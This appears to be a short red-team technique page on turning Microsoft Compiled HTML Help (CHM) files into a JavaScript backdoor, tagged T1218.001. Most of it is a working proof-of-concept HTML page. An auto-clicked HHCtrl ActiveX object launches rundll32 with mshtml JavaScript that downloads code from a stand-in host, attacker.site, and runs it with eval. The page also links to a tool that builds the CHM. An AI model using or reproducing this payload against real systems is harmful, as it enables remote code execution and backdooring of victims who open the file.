# CHM files with JS
Microsoft Compiled HTML Help (CHM) is a Microsoft online help format, consisting of a collection of HTML pages and navigation tools, compressed in a binary format with the extension CHM. When programmically downloaded CHM files do not have to be "unblocked" to be executed.

[blogpost](https://thisissecurity.stormshield.com/2014/08/20/poweliks-command-line-confusion/)

HTML file which needs to be added to the CHM file
```html
<!DOCTYPE html><html><head><title>Click Me</title><head></head><body>
PoC ! <br>
<OBJECT id=x classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11" width=1 height=1>
<PARAM name="Command" value="ShortCut">
<PARAM name="Button" value="Bitmap::shortcut">
<PARAM name="Item1" value=',rundll32.exe,javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WinHttp.WinHttpRequest.5.1");h.Open("GET","http://attacker.site/connect",false);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im rundll32.exe",0,true);}'>
<PARAM name="Item2" value="273,1,1">
</OBJECT>
<SCRIPT>
x.Click();
</SCRIPT>
</body></html>
```

The CHM files can be automatically create via [creating Compiled HTML Help file](https://raw.githubusercontent.com/samratashok/nishang/master/Client/Out-CHM.ps1)


## Tools
########
########

```meta
ttp: T1218.001
internal: false
requirements:
results: user, admin
description: CHM file containing a custom JavaScript backdoor
```